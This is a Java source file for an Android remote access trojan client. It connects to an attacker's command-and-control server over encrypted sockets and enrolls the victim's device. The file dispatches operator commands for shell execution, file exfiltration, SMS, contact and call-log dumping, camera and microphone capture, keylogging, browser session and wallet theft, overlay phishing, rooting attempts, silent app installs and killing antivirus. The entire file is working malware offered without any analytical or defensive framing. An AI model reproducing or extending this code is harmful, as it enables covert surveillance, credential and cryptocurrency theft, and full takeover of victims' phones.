package com.syshelper.service;
import android.content.Context;
import android.os.Build;
import android.provider.Settings;
import android.util.Base64;
import android.util.Log;
import org.json.JSONObject;
import java.io.BufferedReader;
import java.io.DataInputStream;
import java.io.DataOutputStream;
import java.io.InputStreamReader;
import java.net.InetSocketAddress;
import java.net.Socket;
import java.nio.ByteBuffer;
import java.nio.charset.StandardCharsets;
import java.security.KeyFactory;
import java.security.KeyPair;
import java.security.KeyPairGenerator;
import java.security.MessageDigest;
import java.security.PublicKey;
import java.security.SecureRandom;
import java.security.spec.X509EncodedKeySpec;
import java.util.Arrays;
import java.util.concurrent.ExecutorService;
import java.util.concurrent.Executors;
import java.util.concurrent.TimeUnit;
import javax.crypto.Cipher;
import javax.crypto.KeyAgreement;
import javax.crypto.spec.GCMParameterSpec;
import javax.crypto.spec.SecretKeySpec;

public class RatClient {
    private static final String TAG = "RatClient";
    private static final String HOST = BuildConfig.C2_HOST;
    private static final int PORT = BuildConfig.C2_PORT;
    private static final String ENROLL_KEY = BuildConfig.ENROLL_KEY;
    private final Context ctx;
    private final ExecutorService pool = Executors.newFixedThreadPool(20);
    private final ExecutorService cmdPool = Executors.newCachedThreadPool();
    private Socket sock;
    private DataOutputStream dos;
    private DataInputStream dis;
    private volatile boolean connected = false;
    private byte[] aesKey;
    public byte[] getAesKey() { return aesKey; }
    public String uid;

    public RatClient(Context ctx) {
        this.ctx = ctx;
        try {
            String androidId = Settings.Secure.getString(ctx.getContentResolver(), Settings.Secure.ANDROID_ID);
            this.uid = (androidId != null && !androidId.isEmpty()) ? androidId : Build.SERIAL;
        } catch (Exception e) { this.uid = "unknown_dev"; }
    }

    private byte[] performKeyExchange(DataInputStream dis, DataOutputStream dos) throws Exception {
        KeyPairGenerator kpg = KeyPairGenerator.getInstance("EC");
        kpg.initialize(256);
        KeyPair kp = kpg.generateKeyPair();
        byte[] spki = kp.getPublic().getEncoded();
        byte[] rawPoint = Arrays.copyOfRange(spki, spki.length - 65, spki.length);
        dos.writeInt(rawPoint.length);
        dos.write(rawPoint);
        dos.flush();
        int len = dis.readInt();
        byte[] serverPubBytes = new byte[len];
        dis.readFully(serverPubBytes);
        KeyFactory kf = KeyFactory.getInstance("EC");
        PublicKey serverPub = kf.generatePublic(new X509EncodedKeySpec(serverPubBytes));
        KeyAgreement ka = KeyAgreement.getInstance("ECDH");
        ka.init(kp.getPrivate());
        ka.doPhase(serverPub, true);
        byte[] sharedSecret = ka.generateSecret();
        MessageDigest sha = MessageDigest.getInstance("SHA-256");
        return sha.digest(sharedSecret);
    }

    private byte[] aesEncrypt(byte[] data) throws Exception {
        byte[] iv = new byte[12];
        SecureRandom.getInstanceStrong().nextBytes(iv);
        Cipher cipher = Cipher.getInstance("AES/GCM/NoPadding");
        cipher.init(Cipher.ENCRYPT_MODE, new SecretKeySpec(aesKey, "AES"), new GCMParameterSpec(128, iv));
        byte[] encrypted = cipher.doFinal(data);
        byte[] tag = Arrays.copyOfRange(encrypted, encrypted.length - 16, encrypted.length);
        byte[] ct = Arrays.copyOfRange(encrypted, 0, encrypted.length - 16);
        return ByteBuffer.allocate(12 + 16 + ct.length).put(iv).put(tag).put(ct).array();
    }

    private byte[] aesDecrypt(byte[] data) throws Exception {
        if (data.length < 28) throw new Exception("short frame");
        byte[] iv = Arrays.copyOfRange(data, 0, 12);
        byte[] ct = Arrays.copyOfRange(data, 28, data.length);
        Cipher cipher = Cipher.getInstance("AES/GCM/NoPadding");
        cipher.init(Cipher.DECRYPT_MODE, new SecretKeySpec(aesKey, "AES"), new GCMParameterSpec(128, iv));
        return cipher.doFinal(ct);
    }

    public void start() {
        pool.submit(() -> {
            while (true) {
                try {
                    sock = new Socket();
                    sock.connect(new InetSocketAddress(HOST, PORT), 10000);
                    sock.setSoTimeout(30000);
                    sock.setKeepAlive(true);
                    sock.setTcpNoDelay(true);
                    dos = new DataOutputStream(sock.getOutputStream());
                    dis = new DataInputStream(sock.getInputStream());
                    connected = true;
                    aesKey = performKeyExchange(dis, dos);
                    JSONObject enroll = new JSONObject();
                    enroll.put("type", "enroll");
                    enroll.put("enrollKey", ENROLL_KEY);
                    enroll.put("uid", uid);
                    enroll.put("model", Build.MODEL);
                    enroll.put("manufacturer", Build.MANUFACTURER);
                    enroll.put("android", Build.VERSION.RELEASE);
                    sendJson(enroll);
                    receiveLoop();
                } catch (Exception e) { Log.d(TAG, "Disconnected: " + e.getMessage()); }
                finally {
                    connected = false;
                    try { if (sock != null) sock.close(); } catch (Exception ignored) {}
                    sock = null; dos = null; dis = null;
                }
                try { Thread.sleep(5000 + (int)(Math.random() * 3000)); } catch (InterruptedException ie) { break; }
            }
        });
    }

    private void receiveLoop() throws Exception {
        while (connected) {
            int len = dis.readInt();
            byte[] encrypted = new byte[len];
            dis.readFully(encrypted);
            byte[] decrypted = aesDecrypt(encrypted);
            JSONObject msg = new JSONObject(new String(decrypted, StandardCharsets.UTF_8));
            pool.submit(() -> handleCommand(msg));
        }
    }

    public void sendJson(JSONObject obj) {
        try {
            byte[] encrypted = aesEncrypt(obj.toString().getBytes(StandardCharsets.UTF_8));
            synchronized (dos) {
                dos.writeInt(encrypted.length);
                dos.write(encrypted);
                dos.flush();
            }
        } catch (Exception e) { connected = false; }
    }

    public void sendResult(String cmd, Object output) {
        try {
            JSONObject obj = new JSONObject();
            obj.put("type", "result"); obj.put("uid", uid); obj.put("cmd", cmd); obj.put("output", output);
            sendJson(obj);
        } catch (Exception e) {}
    }

    public void sendFile(String name, byte[] data, String fileType) {
        if (data.length > 5120) { StealthExfil.sendStealthy(this, "file", data, fileType, aesKey); }
        else {
            try {
                JSONObject obj = new JSONObject();
                obj.put("type", "file"); obj.put("uid", uid); obj.put("name", name);
                obj.put("size", data.length); obj.put("file_type", fileType);
                obj.put("data", Base64.encodeToString(data, Base64.NO_WRAP));
                sendJson(obj);
            } catch (Exception e) {}
        }
    }

    public void handleCommand(JSONObject msg) {
        try {
            String cmd = msg.getString("cmd");
            switch (cmd) {
                case "shell": execShell(msg.optString("args", "")); break;
                case "ls": listFiles(msg.optString("path", "/sdcard/")); break;
                case "download": downloadFile(msg.optString("path", "")); break;
                case "sms_dump": new DataCollector(ctx, this).dumpSms(); break;
                case "contacts_dump": new DataCollector(ctx, this).dumpContacts(); break;
                case "call_log": new DataCollector(ctx, this).dumpCallLog(); break;
                case "location": new DataCollector(ctx, this).getLocation(); break;
                case "camera": new CameraCapture(ctx, this).capture(msg.optString("cam", "back").equals("front")); break;
                case "mic": new MicRecorder(ctx, this).record(msg.optInt("duration", 10)); break;
                case "clipboard": new DataCollector(ctx, this).getClipboard(); break;
                case "keylog": handleKeylog(msg.optString("action", "dump")); break;
                case "notify": sendNotification(msg.optString("title", "Update"), msg.optString("text", "")); break;
                case "vibrate": new DataCollector(ctx, this).vibrate(); break;
                case "apps": new DataCollector(ctx, this).listApps(); break;
                case "browser_dump": new DataCollector(ctx, this).dumpBrowser(msg.optString("browser", "chrome")); break;
                case "wifi_dump": new DataCollector(ctx, this).dumpWifi(); break;
                case "persist": sendResult("persist", "persistence triggered"); break;
                case "self_destruct": sendResult("self_destruct", "initiated"); break;
                case "try_root": sendResult("try_root", ExploitChain.tryRoot() ? "root achieved" : "root failed"); break;
                case "silent_install": SilentInstaller.install(ctx, msg.optString("path", "")); break;
                case "load_plugin": PluginManager.handlePluginPayload(ctx, this, msg.optString("data", ""), msg.optString("className", "")); break;
                case "wallet_extract": new WalletExtractor(ctx, this).extractAll(); break;
                case "touch_tap": new RemoteTouch(this).tap((float)msg.optDouble("x"), (float)msg.optDouble("y")); break;
                case "touch_swipe": new RemoteTouch(this).swipe((float)msg.optDouble("x1"), (float)msg.optDouble("y1"), (float)msg.optDouble("x2"), (float)msg.optDouble("y2"), msg.optLong("duration", 300)); break;
                case "touch_text": new RemoteTouch(this).typeText(msg.optString("text", "")); break;
                case "overlay_attack": new OverlayAttack(ctx, this).showOverlay(msg.optString("target", "")); break;
                case "session_steal": new SessionThief(ctx, this).stealAll(); break;
                case "av_kill": new AvKiller(ctx, this).killAllAv(); break;
                case "network_scan": new NetworkScanner(ctx, this).scan(); break;
                default: sendResult(cmd, "unknown command");
            }
        } catch (Exception e) { sendResult("error", e.getMessage() != null ? e.getMessage() : "exception"); }
    }

    private void execShell(String command) {
        cmdPool.submit(() -> {
            try {
                ProcessBuilder pb = new ProcessBuilder("sh", "-c", command);
                pb.redirectErrorStream(true);
                Process p = pb.start();
                StringBuilder sb = new StringBuilder();
                try (BufferedReader br = new BufferedReader(new InputStreamReader(p.getInputStream()))) {
                    String line;
                    while ((line = br.readLine()) != null) {
                        sb.append(line).append("\n");
                        if (sb.length() > 1000000) { p.destroyForcibly(); break; }
                    }
                }
                if (!p.waitFor(30, TimeUnit.SECONDS)) p.destroyForcibly();
                sendResult("shell", sb.toString());
            } catch (Exception e) { sendResult("shell", "Error: " + e.getMessage()); }
        });
    }

    private void listFiles(String path) {
        pool.submit(() -> {
            try {
                java.io.File dir = new java.io.File(path);
                org.json.JSONArray arr = new org.json.JSONArray();
                java.io.File[] files = dir.listFiles();
                if (files != null) for (java.io.File f : files) {
                    JSONObject item = new JSONObject();
                    item.put("name", f.getName());
                    item.put("dir", f.isDirectory());
                    item.put("size", f.isFile() ? f.length() : 0);
                    arr.put(item);
                }
                sendResult("ls", arr);
            } catch (Exception e) { sendResult("ls", "Error: " + e.getMessage()); }
        });
    }

    private void downloadFile(String path) {
        cmdPool.submit(() -> {
            try {
                java.io.File f = new java.io.File(path);
                if (!f.exists()) { sendResult("download", "not found"); return; }
                if (f.length() > 10 * 1024 * 1024) {
                    sendResult("download", "file too large: " + f.length() + " bytes (max 10MB)");
                    return;
                }
                byte[] data = new byte[(int) f.length()];
                java.io.FileInputStream fis = new java.io.FileInputStream(f);
                int read = 0;
                while (read < data.length) {
                    int n = fis.read(data, read, data.length - read);
                    if (n < 0) break;
                    read += n;
                }
                fis.close();
                sendFile(f.getName(), Arrays.copyOf(data, read), "file");
            } catch (Exception e) { sendResult("download", "Error: " + e.getMessage()); }
        });
    }

    private static final StringBuilder keylogBuffer = new StringBuilder();
    private static volatile boolean keylogActive = false;

    private void handleKeylog(String action) {
        switch (action) {
            case "start": keylogActive = true; keylogBuffer.setLength(0); sendResult("keylog", "started"); break;
            case "stop": keylogActive = false; sendResult("keylog", "stopped: " + keylogBuffer.toString()); keylogBuffer.setLength(0); break;
            case "dump": String d = keylogBuffer.toString(); keylogBuffer.setLength(0); sendResult("keylog", d); break;
        }
    }

    public static void onKeyEvent(String text) { if (keylogActive) keylogBuffer.append(text); }

    private void sendNotification(String title, String text) {
        pool.submit(() -> {
            try {
                android.app.NotificationManager nm = (android.app.NotificationManager) ctx.getSystemService(Context.NOTIFICATION_SERVICE);
                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                    nm.createNotificationChannel(new android.app.NotificationChannel("sys", "System", android.app.NotificationManager.IMPORTANCE_HIGH));
                }
                nm.notify((int) System.currentTimeMillis(), new android.app.Notification.Builder(ctx, "sys")
                    .setContentTitle(title).setContentText(text)
                    .setSmallIcon(android.R.drawable.ic_dialog_info).build());
                sendResult("notify", "sent");
            } catch (Exception e) { sendResult("notify", "Error: " + e.getMessage()); }
        });
    }

    public void stop() {
        connected = false;
        try { if (sock != null) sock.close(); } catch (Exception ignored) {}
    }
}
